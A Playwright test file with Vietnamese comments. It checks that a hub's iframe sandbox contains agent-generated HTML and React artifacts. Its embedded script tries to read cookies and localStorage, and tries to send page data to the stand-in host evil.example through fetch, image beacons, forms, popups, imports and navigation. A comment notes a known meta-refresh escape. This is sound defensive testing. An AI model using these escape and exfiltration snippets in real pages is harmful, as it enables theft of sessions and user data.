import { type BrowserContext, expect, type Page, test } from "@playwright/test";
import { ARTIFACT_ORG, ARTIFACT_THREAD_ID, artifactsFixture, fakeArtifactFrames, fakeHub, USER } from "./fake-hub.ts";

/*
 * Bộ ca thoát của SC-001: nội dung do agent viết thử mọi đường đọc dữ liệu của hub hay gửi dữ liệu ra ngoài. Mỗi ca in
 * `ESCAPE <ca> <kết quả>` ra console của khung; ca bị chặn khi thao tác ném lỗi hoặc không trả gì đọc được. Những đường
 * không ném lỗi (điều hướng trang cha, form, meta refresh, prefetch, ảnh) được kiểm bằng yêu cầu mạng và URL của trang.
 */
const ESCAPES = String.raw`
const report = (name, outcome) => console.log("ESCAPE " + name + " " + outcome);
const attempt = async (name, fn) => {
  try {
    const value = await fn();
    report(name, "leak:" + String(value));
  } catch {
    report(name, "blocked");
  }
};
const runEscapes = async () => {
  await attempt("cookie", () => document.cookie);
  await attempt("localStorage", () => {
    const org = localStorage.getItem("hive.org");
    if (org === null) throw new Error("trống");
    return org;
  });
  await attempt("fetch-hub", () => fetch("/rpc/me/get").then((r) => r.status));
  await attempt("fetch-external", () => fetch("https://evil.example/fetch").then((r) => r.status));
  await attempt("websocket", () => new Promise((ok, no) => {
    const ws = new WebSocket("ws://" + location.host + "/ws/terminal");
    ws.onopen = () => ok("open");
    ws.onerror = () => no(new Error("lỗi"));
  }));
  await attempt("parent-document", () => parent.document.cookie);
  await attempt("top-location", () => top.location.href);
  await attempt("window-open", () => {
    const popup = window.open("https://evil.example/popup");
    if (!popup) throw new Error("bị chặn");
    return "opened";
  });
  await attempt("image-beacon", () => new Promise((ok, no) => {
    const img = new Image();
    img.onload = () => ok("loaded");
    img.onerror = () => no(new Error("lỗi"));
    img.src = "https://evil.example/beacon.gif?c=" + encodeURIComponent(String(document.title));
  }));
  await attempt("service-worker", () => navigator.serviceWorker.register("/sw.js").then(() => "registered"));
  await attempt("import-external", () => import("https://evil.example/module.js").then(() => "imported"));
  await attempt("import-hub", () => import("/src/main.tsx").then(() => "imported"));
  // Không ném lỗi khi bị chặn: kiểm bằng URL của trang và yêu cầu mạng.
  try { top.location.href = "https://evil.example/top"; } catch {}
  try { document.getElementById("exfil")?.submit(); } catch {}
  report("done", "ok");
};
`;

const CASES = [
  "cookie",
  "localStorage",
  "fetch-hub",
  "fetch-external",
  "websocket",
  "parent-document",
  "top-location",
  "window-open",
  "image-beacon",
  "service-worker",
  "import-external",
  "import-hub",
];

const HTML = `<!doctype html><html lang="vi"><head><meta charset="utf-8">
<link rel="prefetch" href="https://evil.example/prefetch">
<link rel="stylesheet" href="https://evil.example/style.css">
<title>Thử thoát</title></head><body>
<h1>Thử thoát html</h1>
<img src="https://evil.example/pixel.gif" alt="">
<img src="/rpc/me/get" alt="">
<form id="exfil" action="https://evil.example/form" method="post"><input name="x" value="1"></form>
<script>${ESCAPES}
runEscapes();
</script></body></html>`;

// Bản biên dịch như `compileReact` của hub trả; ca thoát chạy trong effect của component.
const REACT_COMPILED = `import { useEffect } from "react";
import { jsx as _jsx } from "react/jsx-runtime";
${ESCAPES}
export default function App() {
  useEffect(() => { void runEscapes(); }, []);
  return _jsx("h1", { children: "Thử thoát react" });
}
`;

type Seed = { type: "html" | "react"; title: string; content: string; compiled?: string };

async function open(page: Page, context: BrowserContext, seed: Seed) {
  // Cookie phiên của hub có trên trang; khung không được đọc hay gửi kèm nó tới đâu khác.
  await context.addCookies([{ name: "hive_session", value: "bi-mat-phien", url: "http://localhost" }]);
  await page.addInitScript((id) => localStorage.setItem("hive.org", id), ARTIFACT_ORG.id);
  await page.setViewportSize({ width: 1440, height: 900 });
  const fixture = artifactsFixture();
  fixture.message({ role: "user", content: "Thử thoát khỏi khung" });
  const artifact = fixture.leaderSave(seed);
  fixture.message({ role: "leader", content: "Đã tạo." });
  await fakeHub(page, { signedIn: true, user: USER, rpc: fixture.rpcFor(USER) });
  const { frameRequests } = await fakeArtifactFrames(page, fixture);
  const external: string[] = [];
  await context.route("https://evil.example/**", (route) => {
    external.push(route.request().url());
    return route.fulfill({ status: 200, body: "" });
  });
  const reports = new Map<string, string>();
  page.on("console", (message) => {
    const match = /^ESCAPE (\S+) (.*)$/.exec(message.text());
    if (match?.[1] && match[2] !== undefined) reports.set(match[1], match[2]);
  });
  await page.goto(`/leader?thread=${ARTIFACT_THREAD_ID}`);
  return { fixture, artifact, frameRequests, external, reports };
}

/** Không có gì rời khung: trang không đổi URL, không cửa sổ mới, mạng chỉ thấy `/_artifact/frame|lib`. */
async function expectContained(
  page: Page,
  context: BrowserContext,
  { frameRequests, external }: { frameRequests: string[]; external: string[] },
) {
  // Điều hướng, form, prefetch, ảnh không ném lỗi trong khung: chờ thêm rồi mới kiểm mạng.
  await page.waitForTimeout(1500);
  expect(page.url()).toContain(`/leader?thread=${ARTIFACT_THREAD_ID}`);
  expect(context.pages()).toHaveLength(1);
  expect(external).toEqual([]);
  expect(frameRequests.length).toBeGreaterThan(0);
  for (const url of frameRequests) expect(new URL(url).pathname).toMatch(/^\/_artifact\/(frame|lib)\//);
}

const seeds: Seed[] = [
  { type: "html", title: "Thử thoát html", content: HTML },
  { type: "react", title: "Thử thoát react", content: "/* nguồn */", compiled: REACT_COMPILED },
];

for (const seed of seeds) {
  test(`khung cách ly: nội dung ${seed.type} không thoát ra origin của hub hay ra ngoài (SC-001)`, async ({
    page,
    context,
  }) => {
    const opened = await open(page, context, seed);
    const frame = page.frameLocator(`iframe[title="Trang của artifact ${seed.title}"]`);
    await expect(frame.getByRole("heading", { name: seed.title })).toBeVisible();
    await expect.poll(() => opened.reports.get("done"), { timeout: 15_000 }).toBe("ok");
    for (const name of CASES) expect.soft(opened.reports.get(name), name).toBe("blocked");
    await expectContained(page, context, opened);
    await expect(frame.getByRole("heading", { name: seed.title })).toBeVisible();
  });
}

/*
 * SC-001 và mục "HTML cố thoát khung" của spec đòi chặn `<meta http-equiv=refresh>` tới URL ngoài, nhưng tài liệu khung
 * (artifacts-runtime, T004) và CSP của hub (T012) chưa chặn: `sandbox="allow-scripts"` vẫn cho khung tự điều hướng, và CSP
 * không có chỉ thị nào chặn điều hướng. Khung đi sang URL ngoài, mang được dữ liệu trên URL. Giữ ca này là lỗi đã biết để
 * khi runtime sửa (ví dụ bỏ meta refresh lúc dựng tài liệu, gỡ khung khi nó tự nạp lại) thì test báo và bỏ `test.fail`.
 */
for (const [name, content] of [
  [
    "meta refresh",
    '<!doctype html><html><head><meta http-equiv="refresh" content="0;url=https://evil.example/refresh"></head><body><h1>Thử thoát</h1></body></html>',
  ],
  [
    "tự điều hướng bằng script",
    '<!doctype html><html><body><h1>Thử thoát</h1><script>location.href = "https://evil.example/self?d=" + encodeURIComponent(document.title);</script></body></html>',
  ],
] as const) {
  test(`khung cách ly: ${name} tới URL ngoài (lỗi đã biết của runtime)`, async ({ page, context }) => {
    test.fail(true, "artifacts-runtime chưa chặn khung tự điều hướng ra ngoài (SC-001, meta refresh)");
    const opened = await open(page, context, { type: "html", title: "Thử điều hướng", content });
    await expect(page.locator('iframe[title="Trang của artifact Thử điều hướng"]')).toBeVisible();
    await expectContained(page, context, opened);
  });
}

test("khung cách ly: mở URL khung trực tiếp trên tab mới vẫn là origin mờ", async ({ page, context }) => {
  const { fixture, artifact } = await open(page, context, {
    type: "html",
    title: "Trang tĩnh",
    content: "<!doctype html><html><body><h1>Trang tĩnh</h1></body></html>",
  });
  fixture.state.tickets.set("ve-truc-tiep", { kind: "version", id: artifact.id, version: 1, theme: "light" });
  const tab = await context.newPage();
  await fakeArtifactFrames(tab, fixture);
  await tab.goto("/_artifact/frame/ve-truc-tiep");
  await expect(tab.getByRole("heading", { name: "Trang tĩnh" })).toBeVisible();
  // CSP `sandbox` của tài liệu khung: không có `allow-same-origin` nên không đọc được cookie hay bộ nhớ của hub.
  expect(await tab.evaluate(() => window.origin)).toBe("null");
  expect(
    await tab.evaluate(() => {
      try {
        return document.cookie;
      } catch {
        return "blocked";
      }
    }),
  ).toBe("blocked");
});
